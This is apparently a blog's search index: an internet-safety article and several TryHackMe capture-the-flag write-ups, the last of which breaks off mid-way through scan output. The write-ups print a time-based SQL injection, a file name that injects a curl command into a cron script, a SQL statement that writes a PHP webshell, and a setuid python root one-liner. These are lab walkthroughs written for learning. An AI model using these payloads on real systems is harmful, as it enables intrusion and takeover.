[ { "title": "Common Practice While Using Internet", "url": "/posts/common-internet-practice/", "categories": "Article", "tags": "article, internet, privacy", "date": "2022-05-04 00:00:00 +0900", "snippet": "Summary -Internet is huge but it has its pros and cons. With the increasing amount of scams, tracking on internet, I think it is very easy to fall for them if you don’t follow the basics. In this post, I’ll talk about some of the common practice to consider while using Internet. Ofcourse, its just my view and what I think is a good practice. So, if there’s any mistake or anything to add on then do let me know.1. Browser -So, yeah, let’s start with browser first. Below mentioned browsers are the ones which I prefer. You can customize other browsers as well…Firefox -My favourite browser… Why?Its free and open source. (I know nearly all browsers are free so why Firefox?) Well, it collects very less data about you and that too can be disabled in settings. And it got ton of add-ons and themes to choose from. Once, you installed some extensions for adblocking and tracker blocking you should be good to go.Extensions which I’ve mentioned here are also available on Firefox Android. (Another reason why I love Firefox…)Extensions for Firefox -uBlock Origin - From the official page, “uBlock Origin is not just an “ad blocker“, it’s a wide-spectrum content blocker with CPU and memory efficiency as a primary feature.”uBlock Origin works great with blocking ads and stuff. It very rarely breaks any site at all. Also, its light on resources.Privacy Badger - From the official page, “Privacy Badger is a browser extension that stops advertisers and other third-party trackers from secretly tracking where you go and what pages you look at on the web. If an advertiser seems to be tracking you across multiple websites without your permission, Privacy Badger automatically blocks that advertiser from loading any more content in your browser. To the advertiser, it’s like you suddenly disappeared.”NoScript Security Suite - Its optional… What this extension does is, it allows JavaScript and other potentially harmful content to be executed only by trusted web sites of your choice. So, its a good measure for Cross Site Scripting(XSS) attacks but it will probably break some sites.Dark Reader - This one is also optional. What this extension does is, it darkens the page by using Javascript. You don’t want to stare at white light for hours when browsing internet right? But sometimes this breaks sites so that’s a con. But we get a dark mode for all the sites so that’s a pro.Brave -Brave browser is awesome as well. Brave is like a all in one browser which comes with adblocker and tracker blocker and some other nice stuff included so once you install it, you should be good to go. That’s all. Its a whole package. Also, its a nice browser, based on Chromium as well.Comparison image from the official Brave Browser site…2. Use secure connection -Since we talked about browser, let’s see what is a secure connection.Secure connections are designed to protect data sent between two computers via the Internet. For now, what you need to know is HyperText Transfer Protocol Secure (HTTPS) is the most widely used web communications protocol. If you look in the Address field of your web browser right now, it’s likely you’ll see “https://” at the front.What’s the difference between Hypertext Transfer Protocol(HTTP) and Hypertext Transfer Protocol Secure(HTTPS)?You might have guessed it from the full form. HTTP requests and responses are sent in plaintext, which means that anyone can read them. HTTPS corrects this problem by using TLS/SSL encryption.Comparison image from Cloudflare’s site…There are still some sites on the internet which still use plain Hyper Text Transfer Protocol(HTTP). So, while browsing, do not enter any personal or sensitive info on unsecured connection(HTTP). Look for https (not http) in the URL to indicate that there is a secure connection.Remember, anything you do on HTTP connection is sent through plain text so if anyone is spying on you, they can clearly see what you are doing like what URL’s you are visiting or what data you are sending to the website. Using a VPN can solve this but make sure you trust your VPN provider. (More on VPN below.)3. VPN -Ah, VPN….A Virtual Private Network (VPN) creates a secure network connection over a public network such as the internet and encrypts your traffic. Your ISP will continue to know that you are consuming bandwidth, but to their eyes, your traffic will be encrypted. Your real IP address will be hidden, so any server/network you connect to will only see your VPN’s assigned IP address.A paid VPN is recommended, as there are usually no good free ones – such free VPNs will likely collect data from you, be too slow to bother with. The only free VPN I’d recommend is ProtonVPN which works fine for a free user. You just sometimes don’t get speed and obviously premium servers are locked.4. Be careful of what you download -Only download software/apps or anything from a trusted source only. Try not to Google “how to download xyx for free” etc cause most of the times you’ll be redirected to some sketchy sites which will show ton of ads and you may accidentally download and run trojan or malware on your system. It is also possible to make an executable look just like an image or a music file. So, be careful with that.Remember, most of the time for a virus to work, it has to get executed first. So, make sure not to download and open anything from a sketchy source. If you are not sure about the downloaded file, try scanning it using anti-virus programs but remember they are not 100% effective.5. Be aware of Phishing and scams -Phishing is a type of social engineering where an attacker sends a fraudulent (e.g., spoofed, fake, or otherwise deceptive) message designed to trick a person into revealing sensitive information to the attacker or to deploy malicious software on the victim’s infrastructure like ransomware.Well, let’s see it in example.Supposed you clicked on a sketchy link, and it takes you to a normal mail site login with strange url. You still went ahead and enter your username/password there and guess what? The person who’s handling this sketchy site is no other than our little attacker. So, they got your creds. Oh no!!! (If something like this happens with you, just straight up change the password and use 2FA.)Above method is not the only way to phish you, there are others as well. You can research them if you want to know more.Do not click on any random links especially when you get that link from a stranger.6. Use strong password -Oh, password… How many of you use the one good’ol password for all the accounts? I know a lot are. (I’ve also done that so need to be embarassed or anything…) So, why not do that?Suppose one site’s data get compromised and you had account there. So, if you used same password for all other websites then guess what? Yeah, you probably guessed it. Your all accounts can be compromised. Imagine if that leak gets public? Oh no!!!Also, try not to use simple passwords like yourname12, password123, summer2020, etc. Use something like complex which is probably more than 8 characters which contains alphabets, numbers and symbols and is not common like Passw0rd123, etc.You might be saying now, yeah how can we remember all these complex password for all sites then?Well, use a password manager. I’d recommend BitWarden which I’ve personally used and works great. Also, comes with password generator. (And no, I’m not sponsored…)7. Enable 2FA -2 Factor Authorization (2FA) or Multi-factor Authorization (MFA) is an electronic authentication method in which a user is granted access to a website or application only after successfully presenting two or more pieces of evidence (or factors) to an authentication mechanism: knowledge (something only the user knows like a password), possession (something only the user has like a phone), and inherence (something only the user is like a fingerprint).So, even if someone knows your password, if you have 2FA enabled then guess what? They cannot get inside your account unless they pass the 2FA. Pretty nice eh?Also obviously, do not share your One Time Password (OTP) with anyone.8. Use up to date software -Why? Out of date or not regularly updated operating systems and applications put you at risk because they have a lot of vulnerabilities. Many of these vulnerabilities can be easily detected and exploited.Keeping softwares up to date is crucial to preventing malware infections and security breaches. Security patches, bug fixes, and new features are often included in software updates.Conclusion -Hopefully, you found this helpful. Following the above things should improve your internet privacy and security. Do let me know what do you think? Again, this is just my view and what I think is a good practice. So, if there’s any mistake or anything to add on then do let me know." }, { "title": "Plotted-LMS -- Writeup", "url": "/posts/Plotted-lms/", "categories": "TryHackMe, Hard", "tags": "tryhackme, ctf, moodle, cron, logrotten", "date": "2022-04-26 00:00:00 +0900", "snippet": "Summary -Hard rated TryHackMe machine containing several rabbit holes(Rickrolls) and a vulnerable or let’s say badly configured moodle server which can be used to gain initial access. After then for privilege escalation we have to abuse cronjob executing a certain python script and then logrotten thingy(which is also running kinda like cronjob). Overall, its a fun and well made room.Enumeration -Nmap, here we go…nmap -# Nmap 7.92 scan initiated Sat Apr 23 05:05:53 2022 as: nmap -T4 -p- -A -oA port_scan 10.10.151.133Nmap scan report for 10.10.151.133Host is up (0.14s latency).Not shown: 65530 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 67:af:92:c1:f0:9f:8a:18:62:8d:bf:ba:c4:58:8d:52 (RSA)| 256 03:ca:42:df:ef:4b:3e:e6:91:0e:b2:bc:b4:42:1e:d1 (ECDSA)|_ 256 f1:ed:8a:8d:e4:87:d8:c7:69:c1:ca:2b:a4:dc:0c:dc (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)873/tcp open http Apache httpd 2.4.52 ((Debian))|_http-title: Apache2 Debian Default Page: It works|_http-server-header: Apache/2.4.52 (Debian)8820/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)9020/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=4/23%OT=22%CT=1%CU=37643%PV=Y%DS=2%DC=T%G=Y%TM=6263C2AOS:C%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQOS:(SP=104%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%OOS:3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=OS:F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNOS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DOS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%OOS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%WOS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%ROS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 143/tcp)HOP RTT ADDRESS1 137.08 ms 10.11.0.12 137.35 ms 10.10.151.133OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Apr 23 05:11:08 2022 -- 1 IP address (1 host up) scanned in 315.62 secondsUh… A lot of http servers. Sigh… Dirbust here we go…port 80 -Nothing much of interest here.port 873 -Found a hidden online rail management system on this web server at /rail directory. And it is vulnearable to SQLi but no luck so far escalation it.1&#39;) AND (SELECT 9635 FROM (SELECT(SLEEP(5)))BtqU) AND (&#39;alGi&#39;=&#39;alGiport 8820 -Found learning management system at /learn.port 9920 -Found moodle running at /moodle which is interesting. Maybe this is the way. Let’s see… :DWhile registering, it is saying only email address with certain domains are allowed. So, create account with certain domain.)To grab moodle version, we can use moodlescan.And its Moodle v3.9.0-betaExploitation -After logging in, we can see that we can enroll as a teacher. Well, that’s a good sign. Iirc there was a certain moodle exploit to escalate privilege to manager and then get rce. So, let’s search.https://book.hacktricks.xyz/pentesting/pentesting-web/moodle - I always go to this site if I found something unfamiliar.https://www.youtube.com/watch?v=BkEInFI4oIU - this video shows the poc nicely.And with that, we can now try to exploit it.Post Exploitation -www-data to plot_admin -moodle_user: (Don&#39;t worry this creds doesn&#39;t matter...)Tried both but didn’t work…Above crontab linpeas output will come in handy in a later time… :DFfs… Damn this box…import osmoodle_location = &quot;/var/www/uploadedfiles/filedir/&quot;backup_location = &quot;/home/plot_admin/.moodle_backup/&quot;os.system(&quot;/usr/bin/rm -rf &quot; + backup_location + &quot;*&quot;)for (root,dirs,files) in os.walk(moodle_location): for file in files: os.system(&#39;/usr/bin/cp &quot;&#39; + root + &#39;/&#39; + file + &#39;&quot; &#39; + backup_location)So, its probably this script… Sigh… (Remember the crontab output from linpeas?)Let’s analyse it.So yeah, I know I’m bad at coding so had to do a lot of testing and stuff…First, I grabbed backup.py on my local machine and played with it until I manage to exploit it.We cannot do anything about the first os.system call but can abuse the second one.&quot; || curl 10.11.49.212 &quot;If we create a filed named like above and run the script we can see the connection approaching to our server.Okay, so next part is pretty tough as well.Since, we know backup.py is executed by plot_admin as a cron job after some time we need to abuse that but how?Okay, I lied it wasn’t that hard, I just had trouble thinking about it. I used python3 one liner reverse shell and created a file just like our last curl file. Hopefully, will get a shell now.P.S. To avoid shell escaping, just create a python revshell using gui file manages and then use terminal to list it and grab the name. Ezpz eh?And finally!!! Its been 84 years… XDplot_admin to root -Hmm.. A logrotate.timer but its empty when opened.There was a rsync cronjob running as root as well. Let’s use pspy to get more info…Hmm… Interesting…https://book.hacktricks.xyz/linux-unix/privilege-escalation#logrotate-exploitationExploit is kinda funky, may or may not work the first time or several or maybe you will need to reset a machine. So, don’t give up… o7Finally root…" }, { "title": "Ollie -- Writeup", "url": "/posts/Ollie/", "categories": "TryHackMe, Medium", "tags": "tryhackme, ctf, SQLi, timer", "date": "2022-04-13 00:00:00 +0900", "snippet": "Summary -Medium rated TryHackMe machine containing misconfigured web application which is leveraged to get initial access. For privilege escalation there is credential reuse and abuse of system timer service.Enumeration -Nmap, here we go…nmap -# Nmap 7.92 scan initiated Tue Apr 12 09:36:17 2022 as: nmap -T4 -p- -A -oA port_scan 10.10.123.41Nmap scan report for 10.10.123.41Host is up (0.13s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b7:1b:a8:f8:8c:8a:4a:53:55:c0:2e:89:01:f2:56:69 (RSA)| 256 4e:27:43:b6:f4:54:f9:18:d0:38:da:cd:76:9b:85:48 (ECDSA)|_ 256 14:82:ca:bb:04:e5:01:83:9c:d6:54:e9:d1:fa:c4:82 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))| http-robots.txt: 2 disallowed entries |_/ /immaolllieeboyyy| http-title: Ollie :: login|_Requested resource was http://10.10.123.41/index.php?page=login|_http-server-header: Apache/2.4.41 (Ubuntu)1337/tcp open waste?| fingerprint-strings: | DNSStatusRequestTCP, GenericLines: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name? What&#39;s up, | It&#39;s been a while. What are you here for?| DNSVersionBindReqTCP: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name? What&#39;s up, | version| bind| It&#39;s been a while. What are you here for?| GetRequest: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name? What&#39;s up, Get / http/1.0| It&#39;s been a while. What are you here for?| HTTPOptions: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name? What&#39;s up, Options / http/1.0| It&#39;s been a while. What are you here for?| Help: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name? What&#39;s up, Help| It&#39;s been a while. What are you here for?| NULL, RPCCheck: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name?| RTSPRequest: | Hey stranger, I&#39;m Ollie, protector of panels, lover of deer antlers.| What is your name? What&#39;s up, Options / rtsp/1.0|_ It&#39;s been a while. What are you here for?1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port1337-TCP:V=7.92%I=7%D=4/12%Time=62558111%P=x86_64-pc-linux-gnu%r(NUSF:LL,59,&quot;Hey\\x20stranger,\\x20I&#39;m\\x20Ollie,\\x20protector\\x20of\\x20panels,\\SF:x20lover\\x20of\\x20deer\\x20antlers\\.\\n\\nWhat\\x20is\\x20your\\x20name\\?\\x20SF:&quot;)%r(GenericLines,93,&quot;Hey\\x20stranger,\\x20I&#39;m\\x20Ollie,\\x20protector\\x2SF:0of\\x20panels,\\x20lover\\x20of\\x20deer\\x20antlers\\.\\n\\nWhat\\x20is\\x20youSF:r\\x20name\\?\\x20What&#39;s\\x20up,\\x20\\r\\n\\r!\\x20It&#39;s\\x20been\\x20a\\x20while\\.SF:\\x20What\\x20are\\x20you\\x20here\\x20for\\?\\x20&quot;)%r(GetRequest,A1,&quot;Hey\\x20sSF:tranger,\\x20I&#39;m\\x20Ollie,\\x20protector\\x20of\\x20panels,\\x20lover\\x20of\\SF:x20deer\\x20antlers\\.\\n\\nWhat\\x20is\\x20your\\x20name\\?\\x20What&#39;s\\x20up,\\xSF:20Get\\x20/\\x20http/1\\.0\\r\\n\\r!\\x20It&#39;s\\x20been\\x20a\\x20while\\.\\x20What\\SF:x20are\\x20you\\x20here\\x20for\\?\\x20&quot;)%r(HTTPOptions,A5,&quot;Hey\\x20stranger,SF:\\x20I&#39;m\\x20Ollie,\\x20protector\\x20of\\x20panels,\\x20lover\\x20of\\x20deer\\SF:x20antlers\\.\\n\\nWhat\\x20is\\x20your\\x20name\\?\\x20What&#39;s\\x20up,\\x20OptionSF:s\\x20/\\x20http/1\\.0\\r\\n\\r!\\x20It&#39;s\\x20been\\x20a\\x20while\\.\\x20What\\x20aSF:re\\x20you\\x20here\\x20for\\?\\x20&quot;)%r(RTSPRequest,A5,&quot;Hey\\x20stranger,\\x20SF:I&#39;m\\x20Ollie,\\x20protector\\x20of\\x20panels,\\x20lover\\x20of\\x20deer\\x20aSF:ntlers\\.\\n\\nWhat\\x20is\\x20your\\x20name\\?\\x20What&#39;s\\x20up,\\x20Options\\x2SF:0/\\x20rtsp/1\\.0\\r\\n\\r!\\x20It&#39;s\\x20been\\x20a\\x20while\\.\\x20What\\x20are\\xSF:20you\\x20here\\x20for\\?\\x20&quot;)%r(RPCCheck,59,&quot;Hey\\x20stranger,\\x20I&#39;m\\x20SF:Ollie,\\x20protector\\x20of\\x20panels,\\x20lover\\x20of\\x20deer\\x20antlers\\SF:.\\n\\nWhat\\x20is\\x20your\\x20name\\?\\x20&quot;)%r(DNSVersionBindReqTCP,B0,&quot;Hey\\SF:x20stranger,\\x20I&#39;m\\x20Ollie,\\x20protector\\x20of\\x20panels,\\x20lover\\x2SF:0of\\x20deer\\x20antlers\\.\\n\\nWhat\\x20is\\x20your\\x20name\\?\\x20What&#39;s\\x20uSF:p,\\x20\\0\\x1e\\0\\x06\\x01\\0\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\x04bind\\0\\0\\x10\\0SF:\\x03!\\x20It&#39;s\\x20been\\x20a\\x20while\\.\\x20What\\x20are\\x20you\\x20here\\x20SF:for\\?\\x20&quot;)%r(DNSStatusRequestTCP,9E,&quot;Hey\\x20stranger,\\x20I&#39;m\\x20Ollie,SF:\\x20protector\\x20of\\x20panels,\\x20lover\\x20of\\x20deer\\x20antlers\\.\\n\\nWSF:hat\\x20is\\x20your\\x20name\\?\\x20What&#39;s\\x20up,\\x20\\0\\x0c\\0\\0\\x10\\0\\0\\0\\0\\SF:0\\0\\0\\0\\0!\\x20It&#39;s\\x20been\\x20a\\x20while\\.\\x20What\\x20are\\x20you\\x20herSF:e\\x20for\\?\\x20&quot;)%r(Help,95,&quot;Hey\\x20stranger,\\x20I&#39;m\\x20Ollie,\\x20protecSF:tor\\x20of\\x20panels,\\x20lover\\x20of\\x20deer\\x20antlers\\.\\n\\nWhat\\x20is\\SF:x20your\\x20name\\?\\x20What&#39;s\\x20up,\\x20Help\\r!\\x20It&#39;s\\x20been\\x20a\\x20wSF:hile\\.\\x20What\\x20are\\x20you\\x20here\\x20for\\?\\x20&quot;);No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP fingerprint:OS:SCAN(V=7.92%E=4%D=4/12%OT=22%CT=1%CU=40343%PV=Y%DS=2%DC=T%G=Y%TM=625581BOS:E%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPSOS:(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST1OS:1NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECNOS:(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(ROS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%FOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CDOS:=S)Network Distance: 2 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 993/tcp)HOP RTT ADDRESS1 132.78 ms 10.11.0.12 132.86 ms 10.10.123.41OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Tue Apr 12 09:42:22 2022 -- 1 IP address (1 host up) scanned in 364.76 secondsHmm… Let’s check web server first.A quick Google search revealed it is vulnerable to SQLi but sadly 1.5 version installed on the machine has vulnerability fixed I guess. :(Tried bruteforcing with ollie as user but got blocked for 5 min… :(On Nmap scan we saw a strange service running on port 1337.Okay, time to connect to 1337 using nc.Oh noice… Make sure to answer right otherwise you won’t get creds. (admin:&amp;lt;redacted&amp;gt;)Okay, logged in with creds but no luck finding anything…On room description, looks like a hint to me…Hmm.. Maybe it is vulnerable to SQLi.Using https://fluidattacks.com/advisories/mercury/ poc.And indeed it is vulnerable… :DExploitation -Phew… After some trial and error finally managed to convert it to rce.&quot; union select null,null,null,&quot;&amp;lt;?php system($_GET[&#39;cmd&#39;]); ?&amp;gt;&quot; into outfile &quot;/var/www/html/backdoor.php&quot; -- -Let’s get reverse shell now.)Post Exploitation -www-data to ollie -Time to enumerate…Found mysql creds… phpipam_ollie:&amp;lt;redacted&amp;gt;Let’s try to switch to ollie user using these creds.And didn’t work… :(Let’s try again with the first password we got from 1337 port service.And worked!!! :Dollie to root -Hmm… Nothing much interesting on linpeas.gcc and make are not installed so forget about it… :(But pspy revealed something interesting…No luck finding that file…find / -group ollie 2&amp;gt; /dev/nullAbove find command revealed one interesting file..Taking a look at linpeas again revealed a system timer. (If you read the room description then you may remember the timer hint.)Interesting…Since, its executing /usr/bin/feedme file which we have write access, so we can use that to escalate our privilege to root.bash suid payloadAnd we are root! :D" }, { "title": "Oh My WebServer -- Writeup", "url": "/posts/Oh-My-WebServer/", "categories": "TryHackMe, Medium", "tags": "tryhackme, ctf, rce, docker, omi", "date": "2022-03-05 00:00:00 +0900", "snippet": "Summary -Medium rated machine whose Apache server is vulnerable(cve-2021-42013) to path traversal and rce. After getting initial access, we have to escape docker.Enumeration -nmap, here we go…nmap -# Nmap 7.92 scan initiated Sat Mar 5 09:53:37 2022 as: nmap -T4 -p- -A -oA port_scan 10.10.89.68Nmap scan report for 10.10.89.68Host is up (0.21s latency).Not shown: 65533 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 e0:d1:88:76:2a:93:79:d3:91:04:6d:25:16:0e:56:d4 (RSA)| 256 91:18:5c:2c:5e:f8:99:3c:9a:1f:04:24:30:0e:aa:9b (ECDSA)|_ 256 d1:63:2a:36:dd:94:cf:3c:57:3e:8a:e8:85:00:ca:f6 (ED25519)80/tcp open http Apache httpd 2.4.49 ((Unix))|_http-title: Consult - Business Consultancy Agency Template | Home| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Apache/2.4.49 (Unix)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portAggressive OS guesses: Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%), Linux 2.6.39 - 3.2 (86%), Infomir MAG-250 set-top box (86%)No exact OS matches for host (test conditions non-ideal).Network Distance: 5 hopsService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTE (using port 80/tcp)HOP RTT ADDRESS1 8.53 ms 10.17.0.12 ... 45 155.98 ms 10.10.89.68OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Mar 5 10:06:33 2022 -- 1 IP address (1 host up) scanned in 776.46 secondsport 80 -Enumerated website but cannot find any interesting stuff… Back to basics. So, searched for Apache 2.4.49 and found out it is vulnerable to path traversal and rce. Great…There is a readily available exploit which works but let’s do it a bit manually…https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013Above article explained it nicely so do give it a read…So, let’s get Burp started and intercept the request…Path traversal was failing so I tried rce one and that worked!So, with that we should be able to get reverse shell.Exploitation -Let’s try to get reverse shell now.So, python3 is installed… Let’s use python3 reverse shell then.And we got a reverse shell.Post Exploitation -Let’s run linpeas.Looks like we are inside a docker container…Interesting… setuid on python3… Gtfobins here we go…/usr/bin/python3.7 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;We got root on this container… Now, just need to escape it ig… Sigh…Interesting…No mention of 10. ip. So, .1 is probably the host machine.Well, tried nmap version reveal but no luck. That looks like winrm port but its a Linux machine.Found this on hackbooks website. It even has a link for the latest CVE-2021-38647 (OMIGOD) exploit which looks a bit similar to room name.cve-2021-38647To get a root shell, host a python3 reverse shell file and upload that to the server and use it to get reverse shell." }, { "title": "Flatline -- Writeup", "url": "/posts/Flatline/", "categories": "TryHackMe, Easy", "tags": "tryhackme, ctf, rce, freeswitch, printspoofer", "date": "2022-02-27 00:00:00 +0900", "snippet": "Summary -Easy rated Windows machine which is pretty fun and straight forward. For initial access we use freeswitch’s vulnerability and for privilege escation there are a couple ways, I used printspoofer to get nt authority\\System.Enumeration -nmap, here we go… (Make sure to use -Pn cause this machine does not responds to ping.)nmap -# Nmap 7.92 scan initiated Sun Feb 27 09:11:58 2022 as: nmap -T4 -p3389,8021 -A -oA nmap/Flatline -Pn 10.10.213.98Nmap scan report for 10.10.213.98Host is up (0.16s latency).PORT STATE SERVICE VERSION3389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: WIN-EOM4PK0578N| NetBIOS_Domain_Name: WIN-EOM4PK0578N| NetBIOS_Computer_Name: WIN-EOM4PK0578N| DNS_Domain_Name: WIN-EOM4PK0578N| DNS_Computer_Name: WIN-EOM4PK0578N| Product_Version: 10.0.17763|_ System_Time: 2022-02-27T14:12:18+00:00| ssl-cert: Subject: commonName=WIN-EOM4PK0578N| Not valid before: 2021-11-08T16:47:35|_Not valid after: 2022-05-10T16:47:35|_ssl-date: 2022-02-27T14:12:19+00:00; 0s from scanner time.8021/tcp open freeswitch-event FreeSWITCH mod_event_socketWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: specializedRunning (JUST GUESSING): AVtech embedded (87%)Aggressive OS guesses: AVtech Room Alert 26W environmental monitor (87%)No exact OS matches for host (test conditions non-ideal).Network Distance: 5 hopsService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsTRACEROUTE (using port 8021/tcp)HOP RTT ADDRESS1 8.24 ms 10.17.0.12 ... 45 169.37 ms 10.10.213.98OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sun Feb 27 09:12:19 2022 -- 1 IP address (1 host up) scanned in 21.65 secondsOkay, so port 8021 is running freeswitch which has 2 exploits available on exploitdb.Exploitation -Metasploit one is tricky, I only got shell one time after several attempts so tried the python one and it worked, got rce.Now, let’s get reverse shell. I’ll use encoded powershell payload.Post Exploitation -Let’s put winpeas on the machine and run it.Vulnerable to couple of exploits…. Interesting…No AV is on machine… Great!Ooh, look… SeImpersonatePrivilege… My bad, should have done whoami /priv before running winpeas.So, juicypotato, printspoofer exploits should work. I’ll use printspoofer.And NT Authority\\System… :D" }, { "title": "Plotted-TMS -- Writeup", "url": "/posts/Plotted-TMS/", "categories": "TryHackMe, Easy", "tags": "tryhackme, ctf, rce, cron, doas", "date": "2022-02-23 00:00:00 +0900", "snippet": "Summary -Easy rated machine which is pretty straight forward except there are some rabbit holes. But as the description says, everything is plotted here.Enumeration -Nmap, here we go…nmap -# Nmap 7.92 scan initiated Wed Feb 23 08:58:11 2022 as: nmap -T4 -p- -A -oA port_scan 10.10.58.61Nmap scan report for 10.10.58.61Host is up (0.16s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 a3:6a:9c:b1:12:60:b2:72:13:09:84:cc:38:73:44:4f (RSA)| 256 b9:3f:84:00:f4:d1:fd:c8:e7:8d:98:03:38:74:a1:4d (ECDSA)|_ 256 d0:86:51:60:69:46:b2:e1:39:43:90:97:a6:af:96:93 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)445/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.41 (Ubuntu)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).TCP/IP 